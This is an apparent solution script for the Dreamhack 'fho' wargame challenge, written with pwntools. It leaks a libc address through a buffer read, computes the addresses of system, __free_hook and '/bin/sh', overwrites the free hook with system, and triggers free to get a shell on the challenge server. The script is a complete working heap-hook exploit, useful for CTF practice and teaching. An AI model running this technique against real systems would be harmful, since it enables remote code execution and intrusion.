from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 18351)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

buf = b"A"*0x48 # buf ~ cnry ~ sfp
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvn(6) + b"\x00" * 2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog('libc_start_main_xx', libc_start_main_xx)
slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('binsh', binsh)

# [2] Arbitrary Address Write
# p.sendlineafter(b"write: ", p64(free_hook))
# p.sendlineafter(b"With: ", p64(system))
p.sendlineafter(b"write: ", str(free_hook).encode())
p.sendlineafter(b"With: ", str(system).encode())


p.sendlineafter(b"free: ", str(binsh).encode())
p.interactive()

